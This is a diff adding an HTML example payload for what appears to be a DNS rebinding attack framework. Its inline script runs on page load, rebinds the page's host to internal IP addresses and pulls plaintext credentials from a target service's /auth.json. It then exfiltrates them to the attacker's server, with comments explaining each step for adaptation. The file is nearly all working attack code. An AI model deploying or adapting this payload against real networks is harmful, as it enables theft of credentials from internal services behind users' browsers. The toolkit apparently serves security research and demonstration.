@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Example Payload</title>
+</head>
+<body>
+<!--
+Load the DNSRebindNode. This static class is used to launch the rebind
+attack and communicate with the DNSRebindAttack instance in example-launcher.html
+-->
+<script type="text/javascript" src="/share/js/DNSRebindNode.js"></script>
+<script type="text/javascript">
+(function() {
+
+    attack()
+    .then(() => {},
+          err => {
+              // there was an error at some point during the attack
+              console.error(err)
+              DNSRebindNode.emit('fatal', err.message)
+          }
+    ) // remove this iframe by calling destroy()
+    .then(() => DNSRebindNode.destroy())
+
+    // You can define your own custom events like this.
+    DNSRebindNode.emit('custom-event', 'just saying hi!')
+
+    // launches the attack and returns a promise that is resolved if the target
+    // service is found and correctly exploited, or more likely, rejected because
+    // this host doesn't exist, the target service isn't running, or something
+    // went wrong with the exploit. Remember that this attack is being launched
+    // against 255+ IP addresses, so most of them won't succeed.
+    async function attack() {
+
+        // DNSRebindNode has some default fetch options that specify things
+        // like no caching, etc... You can re-use them for convenience, or
+        // ignore them and create your own options object for each fetch request.
+        // Here are their default values:
+        // {
+        //     method: "GET",
+        //     headers: {
+        //         // this doesn't work in all browsers. For instance,
+        //         // Firefox doesn't let you do this.
+        //         "Origin": "", //unset the origin header
+        //         "Pragma": "no-cache",
+        //         "Cache-Control": "no-cache"
+        //     },
+        //     cache: "no-cache"
+        // }
+        const getOptions = DNSRebindNode.fetchOptions()
+
+        try {
+            // In this example, we'll pretend we are attacking some service with
+            // an /auth.json file with username/password sitting in plaintext.
+            // Before we swipe those creds, we need to first peform the rebind
+            // attack. Most likely, our webserver will cache the DNS results
+            // for this page's host. DNSRebindNode.rebind(...) recursively
+            // re-attempts to rebind the host with a new, target IP address.
+            // This can take over a minute, and if it is unsuccessful the
+            // primise is rejected.
+            const opts = {
+                // these options get passed to the DNS rebind fetch request
+                fetchOptions: getOptions,
+                // by default, DNSRebindNode.rebind() is considered successful
+                // if it receives a 200 OK response from the target service.
+                // However, you can define any kind of "rebind success" scenario
+                // yourself with the successPredicate(...) function. This
+                // function receives a fetch result as a parameter and the return
+                // value determines if the rebind was successful (i.e. you are
+                // communicating with the target server). Here we check to see
+                // if the fetchResult was sent by our example vulnerable server. 
+                successPredicate: (fetchResult) => {
+                    return fetchResult.headers.get('Server') == 'Example Vulnerable Server v1.0'
+                }
+            }
+
+            await DNSRebindNode.rebind(`http://${location.host}/auth.json`, opts)
+        } catch (err) {
+            // whoops, the rebind failed. Either the browser's DNS cache was
+            // never cleared, or more likely, this service isn't running on the
+            // target host. Oh well... Bubble up the rejection and have our
+            // attack()'s rejection handler deal w/ it.
+            return Promise.reject(err)
+        }
+
+        try {
+            // alrighty, now that we've rebinded the host name and are
+            // communicating with the target service, let's grab the credentials
+            const creds = await fetch(`http://${location.host}/auth.json`)
+                                .then(res => res.json())
+
+             // {
+             //     "username": "crashOverride",
+             //     "password": "hacktheplanet!",
+             // }
+            // console.log(creds)
+
+            // great, now let's exfiltrate those creds to the Node.js server
+            // running this whole shebang. That's the last thing we care about,
+            // so we will just return this promise as the result of attack()
+            // and let its handler's deal with it.
+            //
+            // NOTE: the second argument to exfiltrate(...) must be JSON
+            // serializable.
+            return DNSRebindNode.exfiltrate('auth-example', creds)
+
+        } catch (err) {
+            return Promise.reject(err)
+        }
+    }
+})()
+</script>
+</body>
+</html>
